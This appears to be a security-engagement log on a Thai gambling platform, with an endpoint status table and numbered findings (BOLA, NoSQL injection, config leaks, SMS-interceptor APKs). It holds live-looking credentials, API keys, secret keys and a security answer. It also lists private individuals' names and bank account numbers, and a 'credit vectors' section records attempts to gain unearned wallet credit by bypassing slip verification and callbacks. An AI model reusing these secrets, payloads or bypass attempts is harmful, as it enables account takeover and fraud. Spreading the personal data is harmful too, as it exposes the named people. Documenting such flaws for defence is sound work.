# Engagement: WE88Z-VAK88-2026-09

## Current State (2026-10-18 12:47+07) — POST-ASSESSMENT UPDATE

### Service Status Matrix
| Service | Endpoint | Status |
|---------|----------|--------|
| pbapi (FeathersJS) | /pb/authentication | ✓ WORKING |
| pbapi (FeathersJS) | /pb/latest-win | ✓ NoSQL + DATA LEAK (12 secret_keys) |
| pbapi (FeathersJS) | /pb/latest-withdraw | ✓ DATA LEAK |
| pbapi (FeathersJS) | /webhook-kbank, /webhook-scb, /webhook-ttb, /webhook-sms | ✓ EXIST (401 — body username/password validation; operator-entered in APK UI, no HTTP auth headers per jadx) |
| pbapi (FeathersJS) | /webhooks/sms/truewallet | ✓ EXIST (401 auth) |
| pbapi (FeathersJS) | /webhook/deposit/sms/{kbank,scb,ttb,truewallet} | ✓ EXIST — NEW path from Z Seamless APK; Sign: HMAC-SHA256-base64(body, loginDetails.secretkey); NotAuthenticated without valid appcode+secretkey from C2 |
| pbapi (FeathersJS) | /webhook-kbank-withdraw, /webhook-ttb-withdraw, /webhook/withdraw/sms/{kbank,scb,ktb,ttb}, /webhook-withdraw-kbank, /webhook-withdraw, /webhook/kbank/withdraw | ✓ EXIST (401) — ADB withdraw webhook paths (F92); C2 provides kbankWithdrawUrl+kbankWithdrawToken via /service/withdraw/get-endpoint-webhook; body: {address,amount,bank_code,bank_no,message,password,sms_id,timestamp,type,username} |
| mgapi (Go) | /mb/wallet (GET) | ✓ WORKING |
| mgapi (Go) | /mb/users (GET) | ✓ WORKING (secret_key exposed) |
| mgapi (Go) | POST endpoints | ✓ WORKING (auth block, not crash) |
| mgapi (Go) | /mb/cashback-transfer | ✗ LOCKED — 400 "system in progress" (service back up but locked; persists after is_calculate_cashback=false; below 10 THB min anyway) |
| mgapi (Go) | /mb/rebate-transfer | ✗ LOCKED — same as cashback (2.79 THB available, below 10 THB min) |
| mgapi (Go) | /mb/affiliate-transfer | ✗ LOCKED — same lock (3.32 THB available, below 10 THB min) |
| mgapi (Go) | /mb/minimum-transaction | ✓ {rebate_min:10,cashback_min:10,affiliate_min:10} |
| mgapi (Go) | /mb/firebase-token | ✓ LEAKS custom Firebase token (exchange → ID token via AI key) |
| mgapi (Go) | /mb/coupon-member (POST) | ✗ SERVICE DOWN (500 "Unable to redeem at this time") |
| mgapi (Go) | /mb/quest-daily-check-in | ✗ 400 "Incorrect Information" (feature not configured; quest-information returns []) |
| mgapi (Go) | /mb/jackpot-campaign | ✗ 400 "Unable to join jackpot" (disabled) |
| mgapi (Go) | /mb/auto-slip-deposit | ✗/? CHANGED BEHAVIOR — was 200 no-op (worker disabled); now returns 500 ISE with real order_id (09:38+07) — possible worker re-enable during unlock window |
| mgapi (Go) | /mb/deposit-gateway (AZPAY-QR) | ✓ OPEN (15:58+07) — QR order created; callback requires gateway JWT |
| mgapi (Go) | /mb/deposit-gateway (SCB) | ✓ OPEN (15:58+07) — SCB 4172274759 น.ส. ชนิสรา เหี้ยมหาญ assigned |
| mgapi (Go) | /mb/deposit-gateway (ONE2P-LOCAL) | ✓ OPEN (12:38+07 via cross-tenant JWT eea830ab) — KBANK 1258809633 กชกร บัวสุข; slip.visea.space |
| mgapi (Go) | /mb/deposit-gateway (POMPAY-QR) | ✗ UNAVAILABLE — 400 |
| mgapi (Go) | /mb/deposit-gateway (MYPAYS24-LOCAL) | ✗ UNAVAILABLE — 400 (sysglobalconnect flow blocked; see F84 ext) |
| mgapi (Go) | /mb/deposit-gateway (ALL 126 IDs) | ✗ CYCLICALLY LOCKED — unlocks on schedule; SCB/AZPAY open 15:34+07; monitor running |
| mgapi (Go) | /mb/deposit-gateway-slip | ✓ RE-ENABLED (2026-10-18 12:44+07) — ONE2P-LOCAL order confirmed 200; wallet credited 50 THB (real transfer); F105 revised |
| mgapi (Go) | /mb/auto-slip-deposit | ✗ DISABLED — 500 "unavailable" (worker disabled; F105) |
| mgapi (Go) | /mb/upload-slip | ✗ DISABLED — 400 ISE (F105) |
| mgapi (Go) | /mb/azpay/callback, /mb/pompay/callback, /mb/one2p/callback | ✓ EXIST (401 — gateway-issued Bearer JWT required; not player JWT, not C2 JWT) |
| mgapi (Go) | /mb/sign-url-upload-slip | ✓ WORKING (GCS signed URL) |
| mgapi (Go) | /mb/enter-game | ✓ WORKING (returns ifgtameh.site game URL; cross-tenant JWT accepted) |
| bgapi (Go) | /bo/info/admin (BOLA) | ✓ WORKING (136 admins) |
| bgapi (Go) | /bo/info/assign-settlement-account | ✓ BOLA (89 withdrawal mules) |
| bgapi (Go) | /bo/info/bank-deposit | ✓ BOLA (126 configs) |
| bgapi (Go) | /bo/info/provider | ✓ BOLA (75 game providers) |
| bgapi (Go) | /bo/info/general-config | ✓ BOLA (C2 URL + platform config) |
| bgapi (Go) | /bo/info/settlement-account | ✓ BOLA (live mule balances 106,772 THB across 11 accounts — 2026-10-17 11:00+07; was 84,732 at 08:22+07, +22,040 in ~2.5h) |
| bgapi (Go) | /bo/info/payment-bank-account | ✓ BOLA (67 mule accounts + PII; 53 with bank numbers) |
| bgapi (Go) | /bo/info/admin-activity | ✓ BOLA (44 admin event type categories) |
| bgapi (Go) | /bo/info/crypto-network | ✓ BOLA (5 crypto networks) |
| bgapi (Go) | /bo/info/crypto-token | ✓ BOLA (11 crypto tokens) |
| bgapi (Go) | /bo/notification | ✓ BOLA (notification list) |
| bgapi (Go) | /bo/notification-read | ✓ BOLA (mark-read writable with player JWT) |
| bgapi (Go) | /bo/info/withdraw-settlement | ✓ BOLA (8 withdrawal channels) |
| bgapi (Go) | /bo/info/settlement-gateway-name | ✓ BOLA (4 auto-withdraw gateways) |
| bgapi (Go) | 48+ /bo/info/* endpoints | ✓ BOLA (all return 200 with player JWT) |
| bgapi (Go) | ~320 /bo/* non-info endpoints | ✗ 401 (BO auth required) |
| bgapi (Go) | /bo/authentication | ✓ WORKING (401 auth) |
| C2 | staging-bot.luxino.com | ✗ DOWN |
| C2 | bot-auto.ztechdev.com | ✗ DOWN |
| C2 | {TID}.xyzwalldetop.com | ✓ ALIVE (all paths 404 from non-TH IP; CF proxied; Thai bypass needed) |
| C2 | jellyfish-app-t2kcf.ondigitalocean.app | ✗ DOWN (530 CF origin error) — Z Seamless SMS interceptor C2 |

### Active Credentials
**STORED IN**: `.env.lux` (gitignored) / environment variables at runtime
- Player JWT: `$JWT_VAK88Z2`
- BO Admin: `$BO_ADMIN`
- PAPDIEAW-KEY: `$PAPDIEAW_KEY`
- Firebase API: `$FIREBASE_API_KEY`

### Tenant IDs
- **vak88z2**: `af6efb584a3d317b5a11ab6209b88e1b` (TID: vak88z2) **← ACTIVE**
- **we88c**: `54ef7626cb381f4bab8be91f0cdbce47` (TID: we88c)
- **slxoz1688**: `09b2c3ab78fa9e070e9b0517ed1508d5` (TID: slxoz1688)

### vak88z2 Status (2026-10-17 06:14+07 — UNLOCKED ✓)
- **Wallet**: 0.07 THB | deposit_total: 5,526 THB | cashback_avail: 1.54 | rebate_avail: 2.79 | affiliate_avail: 3.32 | points: 11.18
- **Pending deposits**: 51 in queue (auto-slip worker disabled; status_deposit: false)
- **Player ID**: `ff6c08fb-c109-4c33-9b9f-342e2aca3822`
- **Player**: 0811111111 / วัชชิระ หม่องภิชัย
- **Creds**: 0811111111 / `Pwned2026!` **← ACTIVE**
- **secret_key**: `e4a88a631b28ebd3ebf9e7c07be7560c8437f6549b7fd7ee67b62b5f7c726c38`
- **Security Answer**: `oceanslotz`
- **Banks**: KTB 6655379482, BBL 3037150079 | TrueWallet 0811111111
- **Member Level**: Black (5)
- **BOLA**: ✓ EXTENDED — 46+ /bo/info/* endpoints return 200 (see lux-sitemap.json)
- **JWT**: Refresh as needed — `POST /pb/authentication {"strategy":"local","username":"0811111111","password":"Pwned2026!"}` (~240min TTL)
- **Firebase API key**: `AIzaSyAELPsIAYigvKgJBAsbl_3WM9_tNOr5UiE` (from m.vak88z2.com __NUXT__)
- **Firebase custom token**: GET `/mb/firebase-token` → exchange at `identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken`
- **Firebase RTDB write**: ✓ CONFIRMED — player can PATCH/PUT `/users/{id}/*` (no backend trigger; wallet unaffected)
- **Credit vectors — ALL EXHAUSTED (2026-10-18 00:21+07)**:
  - cashback/rebate/affiliate-transfer: 400 "system in progress" + all below 10 THB min
  - Gateway callbacks (AZPAY/POMPAY/MYPAYS24): 401 gateway-issued JWT required (all auth attempts rejected)
  - deposit-gateway-slip: ✓ RE-ENABLED (2026-10-18) — ONE2P-LOCAL 200 + wallet credited 50 THB via real transfer (F105 revised)
  - auto-slip-deposit: 500 "unavailable" (worker disabled)
  - upload-slip: 400 ISE
  - MYPAYS24 sysglobalconnect.com flow: full chain mapped; **skip-verify tested**: upload+payload succeeds, but deposit NOT credited without chk-slip-by-id.php verification
  - **sysglobalconnect 60-min window mechanics (confirmed 2026-10-17)**:
    - `chk-slip-by-id.php` response includes `dep:{order_creation_time}|slip:{qr_embedded_time}`
    - Real QR CTF083665 (slip: 16-10-2026 21:01:57) → "สลิปเกินเวลา 60 นาที" (dep: 17-10-2026 06:03:09)
    - Fail condition: `|order_create_time - slip_time| > 60 min` — NOT order vs current time
    - To pass: need fresh real QR where slip_time is within 60 min of a new deposit order creation
  - Firebase RTDB write: no backend wallet trigger (confirmed all 3 tenants)
  - **Webhook-scb direct injection (2026-10-18)**: LuxSMS APK SharedPrefs extracted (F112); isLoginKPreference=false; no password stored; 8 body/auth combos all 401; BOLA webhook config routes all 401 — definitively blocked (C2 DOWN)
  - **ADB/LuxSMS APK**: MainActivity crashes (result -92); SmsReceiver never starts; Firebase tokens expired
  - **ALL PATHS DEFINITIVELY EXHAUSTED** — testing complete; only unblocked by real bank transfer (60-min window) or C2 access from Thai IP

### we88c Status (2026-10-15)
- **Wallet**: 0.07 THB (drained; cashback 0.45 THB available)
- **Player ID**: `266d74e3-d6ca-47eb-b9ac-b8c45574bad4`
- **Player**: 0972571110 / ธนวัฒน์ พุฒอินทร์ / `Pwned2026!` **← ACTIVE**
- **GCS Bucket**: `gs://we88z/`
- **Behavior**: Auto-credits deposits (no BO approval) — BUT payment-type returns [] (no deposit methods configured)
- **BOLA**: ✗ PATCHED — bgapi returns 401 with player JWT (confirmed 2026-10-15)
- **Bank accounts**: Empty template (none configured)
- **Provider callbacks**: mgapi /mb/seamless/*, /mb/zseamless/*, /mb/jili/callback etc. all return 401 (exist but require C2-issued JWT)

### slxoz1688 Status (2026-10-17 — LOCKED)
- **Wallet**: 0.56 THB (last confirmed)
- **Player ID**: `7685326c-f840-4cff-a904-f10356e1e04b`
- **Player**: 0972571110 / ธนวัฒน์ พุฒอินทร์
- **Creds**: `0972571110 / Aa112233` — **⚠️ ACCOUNT LOCKED** — persistent (2026-10-15+, all password variants fail; lock exceeded 13h pattern; may be permanently suspended)
- **secret_key**: `eac9d392003f7210210f9b616e8db2eac8a58cddeca58b9d7641a90c2c9fcf43`
- **Banks**: KBANK 0543753327 (player's own sender bank, NOT a mule), TrueWallet 0972571110
- **Member Level**: Silver (1)
- **BOLA**: ✗ PATCHED — bgapi returns 401 with player JWT (F01/F36 not exploitable); cross-tenant JWT also 401
- **Mule bank**: KTB 1190350548 / ประสงค์ ทรัพย์สมบูรณ์ (payment_bank_information_id: `798389ac-3167-4d46-915d-6549f3869480`)
- **auto-slip-deposit**: HTTP 200 "success" with `deposit_amount` field — worker disabled (no wallet credit, pending count stuck at 103)
- **deposit-gateway**: HTTP 400 "unavailable"
- **GCS Upload**: sign-url-upload-slip ✓ WORKING → pcdn.i-gamingplatform.com/{TID}/deposit_slip/
- **GCS Bucket lbb99**: PRIVATE (403)
- **Firebase RTDB**: ✓ ACCESSIBLE (2026-10-17) — Firebase key `AIzaSyCwnV0I-ctdP_nxdhCTDihk-G2ocp8hvpM` (manage.slxoz1688.com __NUXT__); refresh token VALID; player can write `/users/{id}` (frontend notifications only, no backend trigger)
- **Correct auto-slip fields**: `{payment_type_id, payment_bank_information_id, deposit_account_id, slip_image_url, deposit_amount}`

## Confirmed Findings

### F01: BOLA /bo/info/admin [CONFIRMED - HIGH]
- **Impact**: 136 BO admin accounts with UUIDs exposed
- **Vector**: Player JWT accesses admin-only endpoint
- **Evidence**: Full admin list including finance/support teams
- **Note**: Domain parameter ignored (tenant isolation by TID only)

### F36: BOLA /bo/info/assign-settlement-account [CONFIRMED - CRITICAL]
- **Impact**: 89 withdrawal mule accounts with full PII exposed
- **Vector**: Player JWT accesses settlement/withdrawal account list
- **Evidence**: Bank names, account numbers, account holder names
- **Banks**: SCB (9), KBANK (19), KTB (8), GSB (16), BBL (27), LHBANK (5)
- **Payment APIs**: AlphaPay, MyPay24, One2p, PomPay
- **CWE**: CWE-639 (Authorization Bypass), CWE-200 (Information Exposure)
- **Saved**: `data/json/vak88z2_extract/settlement_accounts_2026-10-13.json`

### F02: NoSQL $where Injection /pb/latest-win [CONFIRMED - CRITICAL]
- **Impact**: JavaScript execution in MongoDB queries
- **Vector**: `$where=this.secret_key.length>0`
- **Evidence**: 22 unique game provider secret_keys extracted
- **CWE**: CWE-943 (NoSQL Injection)

### F03: Public Data Leak /pb/latest-withdraw [CONFIRMED - MEDIUM]
- **Impact**: Withdrawal records with amounts/status
- **Vector**: No auth required
- **Evidence**: 10 records per query

### F04: LuxSMS APK Malware Architecture [INFO]
- **Impact**: Full SMS interception infrastructure mapped
- **Flow**: BroadcastReceiver → C2 auth → dynamic webhook → platform
- **Endpoints**: /webhook-kbank, /webhook-scb, /webhook-sms, /webhooks/sms/truewallet
- **Auth**: PAPDIEAW-KEY (static) + bank-specific keys (from C2)

### F61: Admin Manage Panel __NUXT__ Config Leak [CONFIRMED - HIGH]
- **Impact**: All 3 tenant manage panels leak internal Docker hostnames, Firebase configs, 4th API URL
- **Panels**: manage.vak88z2.com, manage.we88c.com, manage.slxoz1688.com (all HTTP 200, no auth)
- **4th API**: `{TID}api.asdgapicenterssdo.com` — BFF proxy with MB/BO routes
- **we88c Firebase**: New project `we88zz` key `AIzaSyAI5j8kaGDUcUDE5ZMk9Um4CneqEx-4q-s`
- **Admin routes**: 60+ routes from JS bundle (649fef7.js)

### F62: Unauthenticated Cache Clear — `/pb/steavej0b/clearcache` [CONFIRMED - MEDIUM]
- **Impact**: All 3 tenants — no auth required, returns "ok"; clears platform cache
- **Vector**: GET/POST to `{TID}pbapi.asdgapicenterssdo.com/pb/steavej0b/clearcache`
- **Risk**: Rate limit bypass, session blacklist invalidation, cache stampede DoS
- **CWE**: CWE-306, CWE-656

### F63: Feature Flag Exposure — `/pb/enable-feature` [CONFIRMED - INFO]
- **Impact**: Returns `{"rebate":true,"cashback":true,"affiliate":true,"point":true}` — no auth
- **All 3 tenants affected**

### F64: Time-Limited Account Lockout — vak88z2 [CONFIRMED - MEDIUM]
- **Impact**: Platform account lockout is temporary; lock expires after ~13h allowing full re-access
- **Evidence**: vak88z2 (0811111111) returned 400 "Incorrect Information" from 09:00+07; same credentials returned 200 at 22:30+07 (~13.5h later)
- **BOLA re-confirmed**: All 6 bgapi endpoints return 200 with fresh JWT (136 admins, 88 settlement accounts)
- **Implication**: Account lockout provides no lasting security — adversary can simply wait out the lock window
- **CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-613 (Insufficient Session Expiration)

### F78: Settlement Transfer Locked — 400 "system in progress" [CONFIRMED - MEDIUM]
- **Tenants**: vak88z2 (cashback+rebate 400 "system in progress"; affiliate 400 ISE; all below 10 THB min)
- **Correct params**: `POST /mb/cashback-transfer {"user_id":"<uuid>","amount":N}` — confirmed from Nuxt bundle
- **Minimum**: 10 THB for all types; available balances all below (1.54/2.79/3.32 THB)
- **Lock behavior**: Application-level lock; does NOT clear when is_calculate_cashback=false
- **Validation works**: `{"amount":10}` → "Cashback is not enough" (correct error); lock persists independently
- **CWE**: CWE-703, CWE-840

### F79: pbapi Socket.io WSS 401 — NOT VULNERABLE [INFO]
- All WS upgrade attempts return 401; JWT in header causes 404 (CF routing anomaly)
- No unauthenticated FeathersJS service PATCH possible via socket.io

### F65: Prototype Pollution — NOT VULNERABLE [INFO]
- **Test**: `__proto__` and `constructor.prototype` in FeathersJS `/pb/authentication` body
- **Result**: No differential response; payload keys ignored/stripped by FeathersJS JSON parser
- **Conclusion**: Platform not vulnerable to server-side prototype pollution via auth endpoint

### F66: SSRF via slip_image_url — UNCONFIRMABLE [INFO]
- **Test**: AWS meta, GCP meta, file://, internal IPs in `slip_image_url` field of `/mb/auto-slip-deposit`
- **Result**: Homogeneous 500 "deposit method unavailable" — endpoint disabled server-side
- **Path traversal**: `/mb/sign-url-upload-slip` `filename` field — server replaces with UUID, client-supplied filename ignored
- **Conclusion**: SSRF cannot be confirmed (endpoint disabled); path traversal not exploitable

### F60: PAPDIEAW-KEY Hardcoded in Public APK [CONFIRMED - MEDIUM]
- **Impact**: TrueWallet C2 auth key extractable from publicly-downloadable APK; kbank/scb/sms webhooks have NO HTTP auth headers
- **Vector**: jadx decompile of `gs://luxino-public/app-sms/LuxSms-v3.apk` → `ListApi.java` @Headers annotation
- **Key**: `649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80`
- **Architecture (jadx-confirmed 2026-10-17)**:
  - `/webhook-scb`, `/webhook-kbank`, `/webhook-sms`: NO HTTP auth headers; body `username`/`password` fields validated by platform against operator-entered SharedPrefs values
  - `/webhooks/sms/truewallet` (`SendSms`): `@Headers PAPDIEAW-KEY` + `@Body SendSmsRequest`
  - `ReadSmstrueWallet`: dynamic URL, `@Header Authorization` (C2 main Bearer) + `@Header papdieawKey` (C2 scbToken/trueToken per bank)
  - C2 `/service/deposit/get-endpoint-webhook` returns `ScbData{endpoint, key}` — key stored as `scbToken` but NOT forwarded to webhook
  - Body `username`/`password` come from `getUsernameSCB()`/`getPasswordSCB()` SharedPrefs — operator-entered, not C2-provisioned
  - Blocking factor: platform validates body creds per-device; no valid creds obtainable without Thai IP to reach C2
- **CWE**: CWE-798 (Hard-coded Credentials)

### F05: Public GCS Buckets [CONFIRMED - HIGH]
- **Impact**: APK distribution infrastructure exposed
- **Buckets**: `luxino-public`, `luxino-pub`, `cdn.i-gamingplatform.com`
- **Evidence**: 8 SMS interceptor APKs downloadable
- **Files**:
  - `app-sms/LuxSms-v2.apk` (8.3MB) — LuxSMS v2
  - `app-sms/LuxSms-v3.apk` (8.3MB) — LuxSMS v3 (jadx analyzed)
  - `app-sms/luxapp2.0.0.apk` (8.9MB) — LuxApp v2.0.0
  - `app-sms/luxsmsV2.2.0.apk` (8.3MB) — LuxSMS v2.2.0
  - `AppV2/app-release.apk` (42MB) — Player app release
  - `AppV2/superAppSmsV1.apk` (72MB) — SuperApp SMS v1 (largest)
  - `AppV2/superAppV1.0.0.apk` (59MB) — Z Seamless (Dart/Flutter, jadx analyzed)
  - `app-release.apk` (18MB) — Root-level player app

### F06: HPP Testing Results [INFO]
- **Behavior**: Node.js/FeathersJS uses FIRST parameter
- **Cross-tenant**: TID-bound isolation (domain param cosmetic)
- **NoSQL operators**: $where, $ne work; $gt/$regex return empty

### F29: User secret_key Leak /mb/users [CONFIRMED - HIGH] (we88c)
- **Impact**: User secret_key exposed in API response
- **Vector**: GET /mb/users returns full user profile including secret_key
- **Evidence**: `secret_key: 3f3139a994f5b319cd8cef8ab621ff6c7d42de92dd5ea57d06bf2f1d04edde44`
- **CWE**: CWE-200 (Information Exposure)
- **Note**: Also leaks payment_accounts with bank_no, affiliate codes

### F52: Deposit Mule Pool Exposure via /mb/deposit-gateway [CONFIRMED - HIGH]
- **Impact**: Player JWT reveals deposit-reception mule accounts distinct from F36/F48 pools
- **Vector**: POST /mb/deposit-gateway with any payment_type bank_detail_id returns full mule PII
- **Exposed accounts** (vak88z2, account eea830ab):
  - SCB `1704275050` — น.ส. ชลธิชา คำมี (not in F36 or F48)
  - GSB `020471576973` — นาง จรี นุ่มลมูล
  - KBANK `2338061601` — บจก. แองเจิ้ล ท็อปซีเคร็ท (AUTO-SLIP pool)
  - TRUEWALLET `0962850415` — วรรณวนัช ทรัพย์สมบูรณ์
- **Evidence**: `data/json/vak88z2_extract/deposit_gateway_mules_2026-10-15.json`
- **CWE**: CWE-639 (Authorization Bypass), CWE-200 (Information Exposure)
- **Note**: Each gateway call creates a real DB order. Slip confirmation disabled server-side.
- **Extended BOLA (2026-10-15)**: 35/49 out-of-config bank_detail_ids from bgapi list also accepted
  - SCB bank_detail_ids (22) all route to same active mule: SCB 1704275050 (น.ส. ชลธิชา คำมี)
  - GSB bank_detail_ids (8) → GSB 020471576973 (นาง จรี นุ่มลมูล)
  - KTB bank_detail_ids (4) → KTB 0170738035 (บจก. ซู ซู ช้อบ 789) [**SUSPENDED**]
  - KBANK bank_detail_id (1) → KBANK 2178190108 (สิรินภา) [**CANNOT RECEIVE TRANSFERS**]
- **Evidence**: `data/json/vak88z2_extract/deposit_gateway_bola_mules_2026-10-15.json`

### F53: Suspended Mule Accounts Still Assigned [CONFIRMED - HIGH]
- **Impact**: Platform directs depositing players to frozen/suspended bank accounts
- **Vector**: deposit-gateway assigns KTB 0170738035 ("พักใช้ ติดต่อธนาคาร") and KBANK 2178190108 ("โอนเข้าไม่ได้") to players
- **Risk**: Player funds sent to frozen accounts = lost deposits; player cannot recover funds
- **Admin notes in bgapi**: Accounts flagged with AMLA freeze dates (พรก.) and "contact branch" notes
- **CWE**: CWE-840 (Business Logic Error), CWE-200

### F54: auto-slip-deposit Fake Success / No-Op [CONFIRMED - MEDIUM]
- **Endpoints**: `POST /mb/auto-slip-deposit`, `POST /mb/upload-slip`, `POST /mb/match-slip`
- **auto-slip-deposit behavior**: Returns HTTP 200 "success" for ANY input, wallet NEVER credited
  - `qr_string` field is completely unenforced — timestamp, empty string, null, garbage all return 200
  - 34 real KBank QRs (cross-tenant replay) all return 200 but wallet unchanged
  - BO queue (notification-count) stays 0 after all submissions
  - `/mb/deposit-transaction` crashes (400 ISE) — cannot verify if DB records exist
- **Dedup is active**: `upload-slip` registers slip filename; re-submission returns "already been used"
  - Dedup blocks repeated use of same GCS filename (not same qr_string)
- **Root cause**: Async processing worker disabled for this tenant (`auto-slip-deposit` feature-flagged off)
  - HTTP 200 is queue-acknowledge; the worker that credits wallet is not running
- **WAF note**: Real 266KB JPEG triggers CF-403 on `/mb/match-slip`; synthetic inputs return 400 ISE
- **GCS chain works up to final step**: sign-url-upload-slip → GCS PUT (200) → upload-slip (200) → auto-slip-deposit (200 no-op)
- **Impact**: False success misleads players expecting deposit credit; no actual wallet credit path found
- **CWE**: CWE-840 (Business Logic Error), CWE-703 (Improper Check or Handling of Exceptional Conditions)
- **Evidence**: 34+ HTTP 200 "success" responses, wallet stays at 0.26 THB throughout

### F56: BOLA — Real-Time Settlement Mule Balances /bo/info/settlement-account [CONFIRMED - HIGH]
- **Impact**: Live THB balances of all withdrawal mule accounts exposed — **82,510.85 THB** across 10 accounts/gateways
- **Vector**: Player JWT accesses `/bo/info/settlement-account` + `/bo/info/all-settlement-balance`
- **Evidence (2026-10-17)**: GSB 020387431552 น.ส.พิมพ์ใจ พุกสิน 17,834 THB; ONE2P 15,557 THB; KBANK 2363442229 อรรษฎาวุฒิ 13,347 THB; GSB 020488021864 นาย ไพศาล 12,986 THB; KBANK 0538892378 น.ส.อมรรัตน์ 11,363 THB; +5 more
- **Saved**: `data/json/vak88z2_extract/bo_info_settlement-account_2026-10-17.json`
- **CWE**: CWE-639 (Authorization Bypass), CWE-200 (Information Exposure)

### F57: BOLA — C2 Webhook URL + Platform Config /bo/info/general-config [CONFIRMED - HIGH]
- **Impact**: Active C2 webhook URL, 2FA status, settlement queue state exposed to player JWT
- **Vector**: GET `/bo/info/general-config` with player JWT → `bot_webhook_external_url: https://{TID}.xyzwalldetop.com`
- **CWE**: CWE-200, CWE-284

### F58: BOLA — 46+ bgapi Endpoints Accessible via Player JWT [CONFIRMED - HIGH]
- **Impact**: Systemic authorization failure — all bgapi GET routes return 200 to player JWT
- **Evidence**: 946-endpoint sitemap rebuild (2026-10-17); 46+ `/bo/info/*` confirmed 200 with player JWT; additional non-info routes: admin-activity, crypto-network, crypto-token, notification, notification-read
- **Notable**: specific-domain-config (subdomain enum), blacklist-user, upline IDs, permission-event (369KB, 29 records), payment-bank-account (67 mule accounts + full PII), gateway configs, notification-count
- **CWE**: CWE-639 (Authorization Bypass)

### F55: Firebase RTDB Write Access — slxoz1688 [CONFIRMED - LOW]
- **Impact**: Player can write arbitrary data to own `/users/{id}` node — frontend display manipulation
- **Vector**: Firebase ID token + PATCH to `slxoz1688-default-rtdb.asia-southeast1.firebasedatabase.app/users/{id}`
- **Evidence**: HTTP 200 PATCH confirmed; `UPDATE_WALLET`/`UPDATE_CASHBACK` keys writable
- **Limit**: No backend trigger; wallet balance unaffected; cross-user BOLA blocked (401)
- **CWE**: CWE-284 (Improper Access Control)

### F54-SLX: auto-slip-deposit Fake Success — slxoz1688 [CONFIRMED - MEDIUM]
- **Impact**: HTTP 200 "success" despite worker disabled; mule account KTB 1190350548 exposed
- **Vector**: Full GCS chain works (sign-url → PUT → upload-slip → auto-slip-deposit) but no wallet credit
- **Field**: `deposit_amount` required (differs from vak88z2 which accepts any payload)
- **Evidence**: Wallet 0.56 THB unchanged; pending count 103 static
- **CWE**: CWE-840 (Business Logic Error)

### F29-SLX: User secret_key Leak /mb/users — slxoz1688 [CONFIRMED - HIGH]
- **Impact**: secret_key exposed for slxoz1688 player
- **secret_key**: `eac9d392003f7210210f9b616e8db2eac8a58cddeca58b9d7641a90c2c9fcf43`
- **CWE**: CWE-200

### F30-SLX: Z Seamless GCS Service Account Exposure — slxoz1688 [CONFIRMED - MEDIUM]
- **Impact**: Service account email exposed in signed URLs (same service account as we88c)
- **Evidence**: `z-seamless-service-account@z-seamless.iam.gserviceaccount.com` in pcdn.i-gamingplatform.com slxoz1688 URLs
- **CWE**: CWE-200

### F30: Z Seamless GCS Service Account Exposure [CONFIRMED - MEDIUM] (we88c)
- **Impact**: Service account email exposed in signed URLs
- **Vector**: Slip upload signed URL contains GoogleAccessId
- **Evidence**: `z-seamless-service-account@z-seamless.iam.gserviceaccount.com`
- **Bucket**: `pcdn.i-gamingplatform.com/{TID}/deposit_slip/`
- **CWE**: CWE-200 (Information Exposure)

### F78: Settlement Transfer Locked — 400 "system in progress" [CONFIRMED - MEDIUM] (vak88z2)
- **Impact**: `/mb/cashback-transfer`, `/mb/rebate-transfer` locked — returns 400 "system in progress" (was 502); affiliate returns 400 ISE (min 10 THB, available 3.32)
- **Validation confirmed**: `{"amount":10}` → "Cashback is not enough" (400) — routing works; lock is application-level, not infra
- **Lock behavior**: `is_calculate_cashback: false` in `/pb/transfer-status` does NOT clear the mgapi lock; lock persists independently of pbapi calculation flags
- **Available balances**: cashback 1.54 THB, rebate 2.79 THB, affiliate 3.32 THB — all below 10 THB minimum
- **CWE**: CWE-703 (Improper Check or Handling of Exceptional Conditions)

### F79: pbapi Socket.io WSS 401 [INFO] (vak88z2)
- **Test**: socket.io connection attempts (no token, `?token=JWT`, `?accessToken=JWT`)
- **Result**: 401 for all; CF routing causes 404 when Authorization header used in Upgrade request
- **Conclusion**: WSS not accessible to player JWT

### F80: Firebase RTDB Write Access — vak88z2 [CONFIRMED - LOW]
- **Impact**: Player can write arbitrary data to own `/users/{id}` node — frontend display manipulation only
- **Vector 1**: GET `/mb/firebase-token` → Firebase custom token → exchange via `identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=AIzaSyAELPsIAYigvKgJBAsbl_3WM9_tNOr5UiE`
- **Vector 2**: Firebase API key from m.vak88z2.com __NUXT__: `AIzaSyAELPsIAYigvKgJBAsbl_3WM9_tNOr5UiE`
- **Evidence**: PUT/PATCH to `vak88z-default-rtdb.asia-southeast1.firebasedatabase.app/users/{player_id}/*` returns HTTP 200
- **Limit**: No backend trigger; wallet balance unaffected; cross-user BOLA blocked (root returns 401)
- **Same class as**: F55 (slxoz1688)
- **CWE**: CWE-284 (Improper Access Control)
- **Note**: Prior DEPOSIT_APPROVE entries from previous sessions in RTDB (never triggered wallet credit)

### F82: BOLA — 67 Deposit Mule Accounts + Active Route Mapping [CONFIRMED - HIGH]
- **Impact**: Full deposit mule pool exposed (67 accounts); 43/67 IDs confirmed active via deposit-gateway probe → 6 unique live bank destinations
- **Vector**: Player JWT GET `/bo/info/payment-bank-account` → complete mule roster; cross-ref via POST `/mb/deposit-gateway` per ID
- **Account breakdown**: SCB(23), GSB(9), AUTO-SLIP(6), TRUEWALLET(6), KBANK(1), KTB(4), gateways 18
- **Active route map (2026-10-17)**:
  - SCB — all 23 IDs → `SCB 1704275050` น.ส. ชลธิชา คำมี
  - GSB (7/9 IDs) → `GSB 020486841602` น.ส.ณัชชา พาจันทร์
  - GSB (2/9 IDs) → `GSB 020471576973` นาง จรี นุ่มลมูล
  - KTB — all 4 IDs → `KTB 0170738035` บจก. ซู ซู ช้อบ 789 (**SUSPENDED** พักใช้)
  - KBANK — 1 ID → `KBANK 2178190108` สิรินภา (**โอนเข้าไม่ได้**)
  - MYPAYS24-LOCAL → `TTB 9197841712` น.ส. ภัทศา พรรณภักดี (**NEW mule**)
  - AZPAY-QR, POMPAY-QR, PROMPTPAY(3) → QR (no named bank dest)
  - TRUEWALLET(6), AUTO-SLIP(6) → ISE (backend/worker down)
- **Extends**: F52 (deposit gateways), F36 (withdrawal mules), F53 (suspended still routed)
- **Saved**: `data/json/vak88z2_extract/bo_payment_bank_account_2026-10-17.json` + `mule_gw_active_2026-10-17.json`
- **CWE**: CWE-639 (Authorization Bypass), CWE-200 (Information Exposure)

### F83: MYPAYS24-LOCAL Live — New TTB Mule 9197841712 Exposed [CONFIRMED - HIGH]
